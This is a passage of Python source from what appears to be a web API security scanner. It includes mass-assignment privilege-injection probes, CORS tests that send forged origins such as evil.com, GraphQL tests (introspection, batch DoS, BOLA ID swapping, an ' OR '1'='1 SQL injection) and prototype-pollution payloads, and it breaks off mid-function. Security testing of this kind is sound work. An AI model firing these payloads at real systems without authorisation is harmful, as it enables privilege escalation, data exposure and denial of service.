        "customerid", "customer_id", "tenantid", "tenant_id",
        "orgid", "org_id", "ownerid", "owner_id",
        "balance", "credits", "verified", "internal", "impersonate",
    }

    def _parse_obj(self, text):
        if not text:
            return None
        try:
            obj = json.loads(text)
        except Exception:
            return None
        return obj if isinstance(obj, dict) else None

    def _norm_key(self, k) -> str:
        return str(k).lower().replace("-", "").replace("_", "")

    def _strip_volatile(self, obj):
        if isinstance(obj, dict):
            return {
                k: self._strip_volatile(v)
                for k, v in obj.items()
                if self._norm_key(k) not in self._VOLATILE_NORM
            }
        if isinstance(obj, list):
            return [self._strip_volatile(x) for x in obj]
        return obj

    def _dumps(self, obj) -> str:
        try:
            return json.dumps(obj, sort_keys=True, default=str, separators=(",", ":"))
        except Exception:
            return ""

    def _equivalent(self, a, b, a_text="", b_text="") -> bool:
        """True when probe ≈ baseline after stripping timestamps / requestIds."""
        if a is not None and b is not None:
            return self._dumps(self._strip_volatile(a)) == self._dumps(self._strip_volatile(b))
        ta, tb = (a_text or "").strip(), (b_text or "").strip()
        return bool(ta) and ta == tb

    def _json_contains_kv(self, obj, key, value) -> bool:
        """Top-level or exact nested path only — never match creator.X as lastModifier.X."""
        if "." in str(key) or "[" in str(key):
            path = self._parse_path(str(key))
            return self._locate(obj, path) == value
        if isinstance(obj, dict) and key in obj:
            return obj[key] == value
        return False

    def _lookup(self, obj, key):
        if isinstance(obj, dict):
            if key in obj:
                return obj[key]
            for v in obj.values():
                found = self._lookup(v, key)
                if found is not None:
                    return found
        elif isinstance(obj, list):
            for v in obj[:5]:
                found = self._lookup(v, key)
                if found is not None:
                    return found
        return None

    def _unwrap_resource(self, obj):
        if not isinstance(obj, dict):
            return obj
        for k in self._ENVELOPE_KEYS:
            inner = obj.get(k)
            if isinstance(inner, dict) and inner:
                return inner
        return obj

    def _frozen_request(self, sender: RequestSender, point: Dict) -> dict:
        root = point.get("_root_json")
        if isinstance(root, dict) and root:
            return copy.deepcopy(root)
        body = sender.base.body
        if body:
            try:
                parsed = json.loads(body) if isinstance(body, str) else body
                if isinstance(parsed, dict):
                    return copy.deepcopy(parsed)
            except Exception:
                pass
        return {}

    def _is_email_value(self, v) -> bool:
        return isinstance(v, str) and "@" in v and "." in v.split("@")[-1]

    def _collect_unique_keys(self, frozen: dict) -> List[str]:
        """Params that should stay constant across cases (random/dataset values)."""
        keys = []
        if not isinstance(frozen, dict):
            return keys
        for k, v in frozen.items():
            kl = str(k).lower()
            if kl in ("name", "objectname", "object_name") or self._OMIT_KEY_RE.match(str(k)):
                keys.append(k)
            elif self._is_email_value(v):
                keys.append(k)
        # de-dupe, preserve order
        return list(dict.fromkeys(keys))

    def _overlay_unique(self, payload, frozen: dict, unique_keys: List[str],
                        omit: bool = False, except_keys=None) -> dict:
        out = copy.deepcopy(payload) if isinstance(payload, dict) else {}
        skip = set(except_keys or ())
        for k in unique_keys:
            if k in skip:
                continue
            if omit:
                out.pop(k, None)
            elif k in frozen:
                out[k] = copy.deepcopy(frozen[k])
        return out

    def _already_canary(self, frozen: dict, extra: dict) -> bool:
        return all(k in frozen and frozen.get(k) == v for k, v in extra.items())

    def _accepted_keys(self, extra: dict, probe_obj, base_obj) -> List[str]:
        """
        A field is accepted only when the probe JSON contains our canary AND
        the baseline did not already have that key=value. Identical replay of
        the baseline body is never an issue.
        """
        if probe_obj is None or not extra:
            return []
        if self._equivalent(probe_obj, base_obj):
            return []
        accepted = []
        for k, v in extra.items():
            if self._json_contains_kv(probe_obj, k, v) and not self._json_contains_kv(base_obj, k, v):
                accepted.append(k)
        return accepted

    def _looks_elevated(self, old, new) -> bool:
        if new is True and old is not True:
            return True
        if isinstance(new, str) and self._ELEVATED_ROLE_RE.match(new.strip()):
            if not (isinstance(old, str) and self._ELEVATED_ROLE_RE.match(old.strip())):
                return True
        if isinstance(new, list) and any(
            isinstance(x, str) and self._ELEVATED_ROLE_RE.match(x.strip()) for x in new
        ):
            old_s = " ".join(str(x) for x in old) if isinstance(old, list) else str(old or "")
            if not self._ELEVATED_ROLE_RE.search(old_s):
                return True
        return False

    def _privilege_elevated(self, base_obj, probe_obj) -> List[str]:
        notes = []
        if not isinstance(probe_obj, dict):
            return notes

        def walk(o):
            if isinstance(o, dict):
                for k, v in o.items():
                    lk = str(k).lower()
                    if lk in self._ELEVATION_KEYS:
                        old = self._lookup(base_obj, k)
                        if self._looks_elevated(old, v):
                            notes.append(f"{k}: {old!r} → {v!r}")
                    walk(v)
            elif isinstance(o, list):
                for it in o[:3]:
                    walk(it)

        walk(probe_obj)
        return notes

    def _first_nested_dict(self, obj):
        if not isinstance(obj, dict):
            return None, None
        for k, v in obj.items():
            if isinstance(v, dict) and v:
                return k, v
        return None, None

    def _canary_for(self, key, value):
        lk = str(key).lower()
        if isinstance(value, bool) or lk.startswith("is") or lk in (
            "admin", "superuser", "verified", "owner", "internal", "impersonate",
        ):
            return True
        if isinstance(value, (int, float)) or lk in (
            "credits", "balance", "creditlimit", "credit_limit", "accesslevel", "access_level",
        ):
            return 999991
        if isinstance(value, list):
            return ["MASSASSIGN_ADMIN"]
        return "MASSASSIGN_ADMIN"

    def _merge_extras(self, resp_obj, frozen: dict) -> dict:
        extras = {}
        if not isinstance(resp_obj, dict) or not isinstance(frozen, dict):
            return extras
        resource = self._unwrap_resource(resp_obj)
        if not isinstance(resource, dict):
            resource = resp_obj
        for k, v in resource.items():
            if k in frozen:
                continue
            lk = str(k).lower()
            if lk in self._READONLY_META:
                continue
            if lk in self._PRIV_NORM or lk.replace("_", "") in self._PRIV_NORM:
                extras[k] = self._canary_for(k, v)
        return extras

    def _fmt_path(self, path) -> str:
        out = ""
        for p in path:
            if isinstance(p, int):
                out += f"[{p}]"
            else:
                out += f".{p}" if out else str(p)
        return out or "(root)"

    def _parse_path(self, label: str):
        """Inverse of _fmt_path: 'creator[0].customerId' → ('creator', 0, 'customerId')."""
        parts = []
        for m in re.finditer(r'\[(\d+)\]|[^.\[\]]+', label or ""):
            if m.group(0).startswith("["):
                parts.append(int(m.group(1)))
            elif m.group(0):
                parts.append(m.group(0))
        return tuple(parts)

    def _path_salt(self, path) -> int:
        s = self._fmt_path(path).encode("utf-8", errors="replace")
        return int(hashlib.md5(s).hexdigest()[:4], 16) % 900

    def _get_path(self, obj, path):
        cur = obj
        for p in path:
            if isinstance(cur, dict) and p in cur:
                cur = cur[p]
            elif isinstance(cur, list) and isinstance(p, int) and 0 <= p < len(cur):
                cur = cur[p]
            else:
                return self._MISSING
        return cur

    def _set_path(self, obj, path, value) -> bool:
        if not path or not isinstance(obj, (dict, list)):
            return False
        cur = obj
        for p in path[:-1]:
            if isinstance(cur, dict) and p in cur:
                cur = cur[p]
            elif isinstance(cur, list) and isinstance(p, int) and 0 <= p < len(cur):
                cur = cur[p]
            else:
                return False
        last = path[-1]
        if isinstance(cur, dict):
            cur[last] = value
            return True
        if isinstance(cur, list) and isinstance(last, int) and 0 <= last < len(cur):
            cur[last] = value
            return True
        return False

    def _path_exists(self, obj, path) -> bool:
        return self._get_path(obj, path) is not self._MISSING

    def _locate(self, obj, path):
        """Read a full JSON path only. Never fall back to leaf name
        (creator.customerId must not match lastModifier.customerId)."""
        if obj is None or not path:
            return self._MISSING
        for candidate in (obj, self._unwrap_resource(obj)):
            val = self._get_path(candidate, path)
            if val is not self._MISSING:
                return val
        return self._MISSING

    def _iter_leaves(self, obj, path=(), depth=0):
        if depth > 4:
            return
        if isinstance(obj, dict):
            for k, v in obj.items():
                p = path + (k,)
                if isinstance(v, (dict, list)):
                    yield from self._iter_leaves(v, p, depth + 1)
                else:
                    yield p, v
        elif isinstance(obj, list):
            for i, item in enumerate(obj[:20]):
                p = path + (i,)
                if isinstance(item, (dict, list)):
                    yield from self._iter_leaves(item, p, depth + 1)
                else:
                    yield p, item

    def _is_sensitive_key(self, k) -> bool:
        lk = str(k).lower()
        if lk in self._SENSITIVE_EXACT or lk.replace("_", "") in self._SENSITIVE_EXACT:
            return True
        if lk in self._PRIV_NORM or lk.replace("_", "") in self._PRIV_NORM:
            return True
        return False

    def _is_skip_mutate(self, path, value, unique_keys) -> bool:
        """Skip only secrets / huge blobs — every other response param is probed."""
        if not path:
            return True
        leaf = path[-1]
        if isinstance(leaf, str):
            lk = leaf.lower().replace("_", "")
            if lk in self._SKIP_MUTATE_KEYS:
                return True
        if isinstance(value, str) and len(value) > 500:
            return True
        return False

    def _is_expected_writable(self, path, frozen) -> bool:
        if not path or not isinstance(path[-1], str):
            return False
        leaf = path[-1].lower()
        if leaf not in self._EXPECTED_WRITABLE:
            return False
        if any(isinstance(p, str) and self._is_sensitive_key(p) for p in path[:-1]):
            return False
        return self._path_exists(frozen, path) or (len(path) == 1 and path[0] in frozen)

    def _is_interesting(self, path, frozen) -> bool:
        if path and isinstance(path[-1], str) and path[-1].lower() in ("id", "uuid", "guid"):
            if self._path_exists(frozen, path):
                return False
        if any(isinstance(p, str) and self._is_sensitive_key(p) for p in path):
            return True
        if self._is_expected_writable(path, frozen):
            return False
        return not self._path_exists(frozen, path)

    def _mutate_value(self, key, value, path=()):
        salt = self._path_salt(path) if path else 0
        tag = self._fmt_path(path).replace(".", "_") if path else str(key or "f")
        if isinstance(value, bool):
            return not value
        if isinstance(value, int):
            n = value + 777001 + salt
            return n if n != value else value - 777001 - salt
        if isinstance(value, float):
            return value + 777.001 + (salt / 1000.0)
        if value is None:
            return f"MA_{tag}"
        if isinstance(value, str):
            if _is_uuid(value):
                hx = format(salt % 16, "x")
                return value[:-1] + hx if value[-1:] != hx else value[:-1] + ("0" if hx != "0" else "1")
            if self._is_email_value(value):
                return f"ma.{tag}." + value
            if not value:
                return f"MA_{tag}_EMPTY"
            if value.startswith("MA_"):
                return "MA2_" + tag + "_" + value[3:]
            return (f"MA_{tag}_" + value)[:120]
        return self._MISSING

    def _collect_mutations(self, resource, frozen, unique_keys, extras_only=False):
        """(path, old, new) for every response leaf we can uniquely change."""
        mutations = []
        if not isinstance(resource, dict):
            return mutations
        for path, old in self._iter_leaves(resource):
            if self._is_skip_mutate(path, old, unique_keys):
                continue
            if extras_only and self._path_exists(frozen, path):
                continue
            new = self._mutate_value(path[-1] if path else "", old, path=path)
            if new is self._MISSING or new == old:
                continue
            mutations.append((path, old, new))
        mutations.sort(key=lambda t: (0 if self._is_interesting(t[0], frozen) else 1,
                                      self._fmt_path(t[0])))
        return mutations

    def _merge_keep_request(self, request, response) -> dict:
        """Union of original request + response JSON. Overlapping keys keep the
        request value (no duplicate keys). Response-only fields are appended."""
        if not isinstance(response, dict):
            return copy.deepcopy(request) if isinstance(request, dict) else {}
        if not isinstance(request, dict) or not request:
            return copy.deepcopy(response)
        out = copy.deepcopy(response)
        for k, v in request.items():
            if k in out and isinstance(v, dict) and isinstance(out.get(k), dict):
                out[k] = self._merge_keep_request(v, out[k])
            else:
                out[k] = copy.deepcopy(v)
        return out

    def _apply_mutations(self, obj, mutations, structure_src=None) -> dict:
        out = copy.deepcopy(obj) if isinstance(obj, dict) else {}
        src = structure_src if isinstance(structure_src, dict) else (
            obj if isinstance(obj, dict) else {}
        )
        for path, _old, new in mutations:
            if path and isinstance(out, dict) and path[0] not in out and path[0] in src:
                out[path[0]] = copy.deepcopy(src[path[0]])
            self._set_path(out, path, new)
        return out

    def _classify_mutations(self, mutations, probe_obj, base_obj, frozen):
        """Compare each changed param against the new response vs baseline."""
        reflected, ignored, expected = [], [], []
        if probe_obj is None:
            return reflected, ignored, expected
        for path, old, new in mutations:
            label = self._fmt_path(path)
            probe_val = self._locate(probe_obj, path)
            stuck = probe_val is not self._MISSING and probe_val == new
            was_already = self._locate(base_obj, path) == new
            rec = f"{label}: {old!r} → {new!r}"
            if not stuck or was_already:
                ignored.append(rec)
                continue
            if self._is_expected_writable(path, frozen):
                expected.append(rec)
            elif self._is_interesting(path, frozen):
                reflected.append(rec)
            else:
                expected.append(rec)
        return reflected, ignored, expected

    def _response_param_evidence(self, case, reflected, ignored, expected,
                                 unique_kept, base_status, probe_status) -> Tuple[str, str]:
        def _join(rows, limit=12):
            if not rows:
                return "(none)"
            extra = f" (+{len(rows) - limit} more)" if len(rows) > limit else ""
            return "; ".join(rows[:limit]) + extra

        kept_s = ", ".join(unique_kept) or "(none)"
        evidence = (
            f"Case: {case}. Pulled params from the baseline response, changed each value, "
            f"and re-sent. Reflected (server accepted our new value, not in baseline): "
            f"{_join(reflected)}. Not reflected (ignored / read-only): {_join(ignored)}. "
            f"Normal writable fields (not a finding): {_join(expected)}. "
            f"Unique/dataset params kept constant: {kept_s}."
        )
        info = (
            f"case={case}; reflected={reflected}; ignored={ignored}; "
            f"expected_writable={expected}; unique_kept={unique_kept}; "
            f"baseline_status={base_status}; probe_status={probe_status}"
        )
        return evidence, info

    def _analyser(self, case: str, changed: dict, accepted: List[str],
                  unique_kept: List[str], omitted: List[str],
                  base_status: int, probe_status: int) -> Tuple[str, str]:
        chg = ", ".join(f"{k}={v!r}" for k, v in changed.items()) or "(none)"
        acc = ", ".join(accepted) or "(none)"
        kept = ", ".join(unique_kept) or "(none)"
        omit = ", ".join(omitted) or "(none)"
        evidence = (
            f"Case: {case}. Request change: {chg}. "
            f"Accepted in response (not in baseline): {acc}. "
            f"Unique/dataset params kept constant: {kept}; omitted: {omit}. "
            f"Not an identical replay of the baseline body."
        )
        info = (
            f"case={case}; changed={changed}; accepted={accepted}; "
            f"unique_kept={unique_kept}; omitted={omitted}; "
            f"baseline_status={base_status}; probe_status={probe_status}; "
            f"bodies_equivalent=false"
        )
        return evidence, info

    def _issue(self, sender, point, case, extra, accepted, unique_kept, omitted,
               base_resp, probe, evidence, info) -> Issue:
        fields_str = ", ".join(f"{k}={extra[k]!r}" for k in accepted if k in extra) or case
        param_label = ", ".join(accepted) if accepted else (point.get("type") or "request body")
        req_body = ""
        try:
            rb = getattr(getattr(probe, "request", None), "body", None) or ""
            if isinstance(rb, bytes):
                rb = rb.decode("utf-8", errors="replace")
            req_body = rb[:15000]
        except Exception:
            req_body = ""
        return Issue(
            "MEDIUM", self.NAME, param_label, fields_str,
            evidence, sender.base.url, point.get("type") or "body_json",
            request_info=info,
            response_snippet=(probe.text or "")[:500],
            confidence="Firm",
            attack_body=req_body,
        )

    def _send(self, sender: RequestSender, body: dict,
              param: str = "", payload: str = ""):
        if sender._should_stop():
            return None
        if not isinstance(body, dict):
            return None
        _PROBE_META.param = param or ""
        _PROBE_META.payload = payload or ""
        try:
            return sender.send_full_json(body)
        finally:
            _PROBE_META.param = ""
            _PROBE_META.payload = ""

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        if point.get("type") not in ("body_json", "endpoint"):
            return []
        if not base_resp or base_resp.status_code not in range(200, 300):
            return []

        method = (sender.base.method or "").upper()
        writable = method in self._WRITABLE
        frozen = self._frozen_request(sender, point)
        if not frozen and not writable:
            return []

        unique_keys = self._collect_unique_keys(frozen)
        base_text = base_resp.text or ""
        base_obj = self._parse_obj(base_text)
        issues: List[Issue] = []

        def add_issue(case, extra, accepted, payload, probe, omitted=None):
            if len(issues) >= self.MAX_ISSUES or not accepted:
                return
            omitted = omitted or []
            kept = [k for k in unique_keys if k not in omitted]
            ev, info = self._analyser(
                case, extra, accepted, kept, omitted,
                base_resp.status_code, probe.status_code,
            )
            issues.append(self._issue(
                sender, point, case, extra, accepted, kept, omitted,
                base_resp, probe, ev, info,
            ))

        def run_probe(case, extra, payload, omitted=None) -> Optional[requests.Response]:
            omitted = omitted or []
            try:
                pload = json.dumps(extra)[:200]
            except Exception:
                pload = ""
            r = self._send(sender, payload, param=",".join(extra.keys()), payload=pload)
            if not r or r.status_code not in range(200, 300):
                return r
            probe_obj = self._parse_obj(r.text or "")
            accepted = self._accepted_keys(extra, probe_obj, base_obj)
            add_issue(case, extra, accepted, payload, r, omitted)
            return r

        def run_inject(case, extra, omit=False):
            if not extra or self._already_canary(frozen, extra):
                return None
            payload = self._overlay_unique(
                {**frozen, **extra}, frozen, unique_keys, omit=omit
            )
            return run_probe(case, extra, payload, omitted=(unique_keys if omit else []))

        def run_response_mutations(case, src_obj, mutations, merge_into=None, combined=False):
            """Probe extra response params only (never re-add keys already in the request).
            combined=True → one shot: original request ∪ full response, extras mutated."""
            if not mutations:
                return
            all_reflected, all_ignored, all_expected = [], [], []
            last_hit = None
            extra = {}

            def _classify_send(r, muts, label, pload):
                nonlocal last_hit
                if not r:
                    return
                if r.status_code not in range(200, 300):
                    for path, old, new in muts:
                        all_ignored.append(
                            f"{self._fmt_path(path)}: {old!r} → {new!r} (HTTP {r.status_code})"
                        )
                    return
                probe_obj = self._parse_obj(r.text or "")
                if probe_obj is None or self._equivalent(probe_obj, base_obj):
                    for path, old, new in muts:
                        all_ignored.append(f"{self._fmt_path(path)}: {old!r} → {new!r}")
                    return
                reflected, ignored, expected = self._classify_mutations(
                    muts, probe_obj, base_obj, frozen,
                )
                all_reflected.extend(reflected)
                all_ignored.extend(ignored)
                all_expected.extend(expected)
                if reflected:
                    for path, _old, new in muts:
                        lbl = self._fmt_path(path)
                        if any(row.startswith(lbl + ":") for row in reflected):
                            extra[lbl] = new
                    last_hit = r

            if combined:
                body = self._merge_keep_request(frozen, src_obj)
                body = self._apply_mutations(body, mutations, structure_src=src_obj)
                body = self._overlay_unique(body, frozen, unique_keys, omit=False)
                try:
                    pload = json.dumps({self._fmt_path(p): n for p, _o, n in mutations})[:300]
                except Exception:
                    pload = "request+response"
                r = self._send(sender, body, param="request+response", payload=pload)
                _classify_send(r, mutations, "request+response", pload)
            else:
                for path, old, new in mutations:
                    if sender._should_stop():
                        break
                    label = self._fmt_path(path)
                    body = self._apply_mutations(
                        merge_into if isinstance(merge_into, dict) else frozen,
                        [(path, old, new)],
                        structure_src=src_obj,
                    )
                    body = self._overlay_unique(body, frozen, unique_keys, omit=False)
                    try:
                        pload = json.dumps(new)
                    except Exception:
                        pload = str(new)
                    r = self._send(sender, body, param=label, payload=pload)
                    _classify_send(r, [(path, old, new)], label, pload)

            if not all_reflected or last_hit is None or len(issues) >= self.MAX_ISSUES:
                return
            kept = list(unique_keys)
            ev, info = self._response_param_evidence(
                case, all_reflected, all_ignored, all_expected, kept,
                base_resp.status_code, last_hit.status_code,
            )
            issues.append(self._issue(
                sender, point, case, extra, list(extra.keys()), kept, [],
                base_resp, last_hit, ev, info,
            ))

        # 1) Response extras only — never re-send params already in the original
        #    request (e.g. description). One merged case + one probe per extra field.
        if writable and isinstance(base_obj, dict) and not sender._should_stop():
            resource = self._unwrap_resource(base_obj)
            if not isinstance(resource, dict):
                resource = base_obj
            extra_mut = self._collect_mutations(
                resource, frozen, unique_keys, extras_only=True
            )
            if extra_mut:
                run_response_mutations(
                    "request_plus_response", resource, extra_mut, combined=True
                )
                run_response_mutations(
                    "response_extra_params", resource, extra_mut, merge_into=frozen
                )

        # 2) Privilege inject / overwrite on the frozen original request.
        #    Unique/dataset values stay exactly as captured for every case.
        if frozen:
            for bundle in self.INJECT_BUNDLES:
                if sender._should_stop() or len(issues) >= self.MAX_ISSUES:
                    break
                extra = {k: v for k, v in bundle.items() if frozen.get(k) != v}
                if not extra:
                    continue
                r = run_inject("privilege_inject", extra)
                if r is not None and r.status_code not in range(200, 300):
                    for k, v in extra.items():
                        if sender._should_stop() or len(issues) >= self.MAX_ISSUES:
                            break
                        run_inject("privilege_inject", {k: v})

            if len(issues) < self.MAX_ISSUES and not sender._should_stop():
                nk, nested = self._first_nested_dict(frozen)
                if nk:
                    extra = {"isAdmin": True, "role": "MASSASSIGN_ADMIN"}
                    child = {**nested, **extra}
                    payload = copy.deepcopy(frozen)
                    payload[nk] = child
                    payload = self._overlay_unique(payload, frozen, unique_keys, omit=False)
                    run_probe("nested_privilege_inject", extra, payload)

        if not writable:
            return issues

        # 3) Omit unique/dataset params (and the same omit + privilege inject)
        if frozen and unique_keys and not sender._should_stop():
            omitted_payload = self._overlay_unique(frozen, frozen, unique_keys, omit=True)
            r_omit = self._send(sender, omitted_payload)
            if (r_omit and r_omit.status_code in range(200, 300)
                    and len(issues) < self.MAX_ISSUES):
                probe_obj = self._parse_obj(r_omit.text or "")
                if probe_obj is not None and not self._equivalent(probe_obj, base_obj):
                    notes = self._privilege_elevated(base_obj, probe_obj)
                    if notes:
                        extra = {"_elevated": notes}
                        ev, info = self._analyser(
                            "omit_unique_elevation", extra, ["privilege_elevated"],
                            [], unique_keys, base_resp.status_code, r_omit.status_code,
                        )
                        ev = (
                            f"Case: omit_unique_elevation. Unique params omitted: "
                            f"{', '.join(unique_keys)}. Privilege fields elevated vs "
                            f"baseline without injecting them: {'; '.join(notes)}. "
                            f"Not an identical replay of the baseline body."
                        )
                        issues.append(self._issue(
                            sender, point, "omit_unique_elevation", extra,
                            ["privilege_elevated"], [], unique_keys,
                            base_resp, r_omit, ev, info,
                        ))

            if len(issues) < self.MAX_ISSUES and not sender._should_stop():
                extra = dict(self._COMBINED_CANARY)
                payload = self._overlay_unique(
                    {**frozen, **extra}, frozen, unique_keys, omit=True
                )
                run_probe("omit_unique_then_privilege", extra, payload, omitted=unique_keys)

        return issues


# ── CORS MISCONFIGURATION ────────────────────────────────────────────────
class CORSScanner:
    KEY  = "cors"
    NAME = "CORS Misconfiguration"

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        parsed = urllib.parse.urlparse(sender.base.url)
        target = parsed.netloc
        tests = [
            ("https://evil.com",            "Arbitrary origin reflected"),
            ("null",                        "Null origin accepted"),
            (f"https://evil{target}",       "Subdomain trust bypass"),
            (f"https://{target}.evil.com",  "Pre-domain trust bypass"),
            (f"https://{target}-evil.com",  "Hyphenated domain bypass"),
            ("http://localhost",            "Localhost origin trusted"),
            ("http://127.0.0.1",            "127.0.0.1 loopback origin trusted"),
        ]
        for origin, desc in tests:
            headers = sender.base.headers.copy()
            headers['Origin'] = origin
            r = sender.send_raw(headers=headers)
            if not r: continue
            acao = r.headers.get('Access-Control-Allow-Origin', '')
            acac = r.headers.get('Access-Control-Allow-Credentials', '').lower()
            if acao == origin or (origin == 'null' and acao == 'null'):
                sev = "HIGH" if acac == 'true' else "MEDIUM"
                return [Issue(sev, self.NAME, "Origin", origin,
                              f"{desc} | ACAO={acao} ACAC={acac}",
                              sender.base.url, "endpoint")]
            if acao == '*' and acac == 'true':
                return [Issue("HIGH", self.NAME, "Origin", origin,
                              "ACAO=* with ACAC=true (credential leak)",
                              sender.base.url, "endpoint")]
        return []


# ── GRAPHQL INJECTION & INTROSPECTION (MODULE-05) ────────────────────────
class GraphQLScanner:
    KEY  = "graphql"
    NAME = "GraphQL Vulnerability"
    # Nested fragment depth (complexity) — many servers lack cost limits
    _COMPLEX_QUERY = """
    query Q {
      __typename
      ...F0
    }
    fragment F0 on Query { __typename ...F1 }
    fragment F1 on Query { __typename ...F2 }
    fragment F2 on Query { __typename ...F3 }
    fragment F3 on Query { __typename ...F4 }
    fragment F4 on Query { __typename ...F5 }
    fragment F5 on Query { __typename }
    """.strip()

    def _is_graphql(self, req):
        if 'graphql' in req.url.lower(): return True
        if req.body:
            try:
                j = json.loads(req.body)
                if isinstance(j, dict) and ('query' in j or 'operationName' in j):
                    return True
            except Exception: pass
        return False

    def _gql_ok(self, r) -> bool:
        if not r or r.status_code >= 500:
            return False
        # GraphQL often returns 200 with errors[] — still "accepted"
        return r.status_code < 500

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        if not self._is_graphql(sender.base): return []
        issues = []

        # 1. Introspection query
        r = sender.send_full_json({"query": "{__schema{types{name fields{name}}}}"})
        if r and '__schema' in r.text and 'types' in r.text:
            issues.append(Issue("MEDIUM", f"{self.NAME} (Introspection Enabled)",
                                "query", "{__schema{types{name}}}",
                                "Full API schema exposed via introspection",
                                sender.base.url, "graphql"))

        # 2. Field suggestion (verbose errors)
        r = sender.send_full_json({"query": "{usr{name}}"})
        if r and ('did you mean' in r.text.lower() or 'suggestion' in r.text.lower()):
            issues.append(Issue("LOW", f"{self.NAME} (Field Suggestion)",
                                "query", "{usr{name}}",
                                "Server suggests valid field names",
                                sender.base.url, "graphql"))

        # 3. Batching DoS
        batch = [{"query": "{__typename}"}] * 50
        r = sender.send_raw(json_body=batch)
        if r and r.status_code == 200:
            try:
                data = json.loads(r.text)
                if isinstance(data, list) and len(data) >= 50:
                    issues.append(Issue("MEDIUM", f"{self.NAME} (Batch Query)",
                                        "query", "[50× {__typename}]",
                                        "Server processes unbounded batched queries",
                                        sender.base.url, "graphql"))
            except Exception: pass

        # 4. Depth / complexity — server accepts very deep / fragment-heavy queries
        if base_resp and not sender._should_stop():
            r_deep = sender.send_full_json({"query": "{ " + " ".join(
                f"f{i}: __typename" for i in range(40)
            ) + " }"})
            if self._gql_ok(r_deep) and r_deep and "__typename" in (r_deep.text or ""):
                # Only flag if baseline was healthier / smaller — avoid FP on always-error APIs
                if "errors" not in (r_deep.text or "").lower() or (
                    base_resp and "errors" in (base_resp.text or "").lower()
                ):
                    # Accepted without depth rejection keywords
                    rej = re.search(
                        r'depth.?limit|max.?depth|query.?too.?complex|cost.?limit|complexity',
                        r_deep.text or "", re.I,
                    )
                    if not rej and r_deep.status_code == 200:
                        issues.append(Issue("MEDIUM", f"{self.NAME} (No Depth Limit)",
                                            "query", "40× aliased __typename",
                                            "Server accepted a high-alias query without depth/cost rejection",
                                            sender.base.url, "graphql",
                                            response_snippet=(r_deep.text or "")[:500]))

            if not sender._should_stop():
                r_cx = sender.send_full_json({"query": self._COMPLEX_QUERY})
                if (self._gql_ok(r_cx) and r_cx and r_cx.status_code == 200
                        and not re.search(
                            r'depth.?limit|max.?depth|query.?too.?complex|cost.?limit|complexity',
                            r_cx.text or "", re.I)):
                    if "__typename" in (r_cx.text or "") or "data" in (r_cx.text or ""):
                        issues.append(Issue("MEDIUM", f"{self.NAME} (No Complexity Limit)",
                                            "query", "nested fragments F0…F5",
                                            "Server accepted nested fragment query without complexity rejection",
                                            sender.base.url, "graphql",
                                            response_snippet=(r_cx.text or "")[:500]))

        # 5. Nested field / IDOR-ish authz: swap id-like variables → still 200 + data
        if sender.base.body and base_resp and base_resp.status_code == 200:
            try:
                body = json.loads(sender.base.body)
                if isinstance(body, dict) and isinstance(body.get("variables"), dict):
                    for vk, vv in body["variables"].items():
                        if sender._should_stop():
                            break
                        if not isinstance(vv, (str, int)) and not (
                            isinstance(vv, str) and vv.isdigit()
                        ):
                            continue
                        if not re.search(r'(id|uid|user|account|order|uuid)', str(vk), re.I):
                            continue
                        # Mutate ID
                        if isinstance(vv, int) or (isinstance(vv, str) and re.match(r'^\d+$', vv)):
                            probe_val = str(int(vv) + 1) if str(vv).isdigit() else "1"
                        elif _is_uuid(str(vv)):
                            parts = str(vv).split("-")
                            parts[-1] = format((int(parts[-1], 16) + 1) % 16**12, "012x")
                            probe_val = "-".join(parts)
                        else:
                            continue
                        injected = copy.deepcopy(body)
                        injected["variables"][vk] = (
                            int(probe_val) if isinstance(vv, int) else probe_val
                        )
                        r = sender.send_full_json(injected)
                        if not r or r.status_code != 200:
                            continue
                        # Still returns data object without auth error → possible authz gap
                        if (re.search(r'"data"\s*:\s*\{', r.text or "")
                                 and not re.search(
                                     r'unauthorized|forbidden|access.?denied|not.?authorized',
                                     r.text or "", re.I)
                                 and r.text != base_resp.text):
                            issues.append(Issue(
                                "MEDIUM",
                                f"{self.NAME} (Variable Authz / Possible BOLA)",
                                f"variables.{vk}",
                                str(probe_val),
                                f"ID {vv}→{probe_val}: GraphQL still returned data — "
                                "confirm with IDOR Tester (2 tokens)",
                                sender.base.url, "graphql",
                                response_snippet=(r.text or "")[:500],
                            ))
                            break
            except Exception:
                pass

        # 6. SQL injection in variables
        if sender.base.body:
            try:
                body = json.loads(sender.base.body)
                if isinstance(body, dict) and 'variables' in body:
                    for vk, vv in (body.get('variables') or {}).items():
                        if isinstance(vv, str):
                            injected = copy.deepcopy(body)
                            injected['variables'][vk] = "' OR '1'='1"
                            r = sender.send_full_json(injected)
                            if r:
                                for pat in SQLiScanner.DB_ERRORS:
                                    if re.search(pat, r.text, re.I):
                                        issues.append(Issue("HIGH",
                                            f"{self.NAME} (SQLi in Variable)",
                                            f"variables.{vk}", "' OR '1'='1",
                                            f"DB error in GraphQL variable: {pat}",
                                            sender.base.url, "graphql"))
                                        break
            except Exception: pass

        return issues


# ── PROTOTYPE POLLUTION ───────────────────────────────────────────────────
class PrototypePollutionScanner:
    KEY  = "prototype_pollution"
    NAME = "Prototype Pollution"
    PAYLOADS = [
        {"__proto__": {"isAdmin": True}},
        {"constructor": {"prototype": {"isAdmin": True}}},
        {"__proto__": {"admin": 1, "role": "admin", "polluted": "yes", "status": 200}},
        {"constructor": {"prototype": {"polluted": "yes"}}},
        {"__proto__": {"status": 200}},
    ]

    QUERY_KEYS = [
        '__proto__[isAdmin]', '__proto__[admin]', '__proto__[role]',
        '__proto__[polluted]', '__proto__.polluted',
        'constructor[prototype][isAdmin]', 'constructor[prototype][polluted]',
    ]

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        if not base_resp: return []

        # Query-string prototype pollution (e.g. ?__proto__[isAdmin]=true)
        p = urllib.parse.urlparse(sender.base.url)
        if p.query:
            for key in self.QUERY_KEYS:
                dup_q = p.query + ('&' if p.query else '') + f"{urllib.parse.quote(key, safe='[]')}=true"
                r = sender.send_raw(url=p._replace(query=dup_q).geturl())
                if not r: continue
                if base_resp.status_code in (401, 403) and r.status_code == 200:
                    return [Issue("CRITICAL", self.NAME, "query string", f"{key}=true",
                                  f"Privilege escalation: {base_resp.status_code}→{r.status_code}",
                                  sender.base.url, "query")]
                if r.status_code == base_resp.status_code and r.status_code < 400:
                    try:
                        orig_data = json.loads(base_resp.text)
